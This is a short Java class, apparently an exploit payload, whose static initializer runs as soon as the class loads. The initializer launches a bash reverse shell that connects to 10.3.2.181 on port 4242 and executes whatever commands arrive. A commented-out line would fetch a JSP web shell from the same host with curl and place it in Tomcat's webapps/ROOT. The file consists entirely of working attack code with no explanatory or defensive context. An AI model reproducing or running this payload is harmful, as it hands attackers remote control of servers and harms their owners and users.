import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
public class LifExp {

static {

try {
            String[] cmd = {"bash", "-c", "pwd"};
            Process process=java.lang.Runtime.getRuntime().exec(cmd);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String s= stdInput.readLine();
            //String[] cmd2 = {"bash", "-c", "curl -o ../webapps/ROOT/shell.jsp http://10.3.2.181:9091/shell.jsp"};
        	String[] cmd2 = {"/bin/bash","-c","exec 5<>/dev/tcp/10.3.2.181/4242;cat <&5 | while read line; do $line 2>&5 >&5; done"};    
	java.lang.Runtime.getRuntime().exec(cmd2);
        } catch ( Exception e ) {
            e.printStackTrace();
        }

}
}
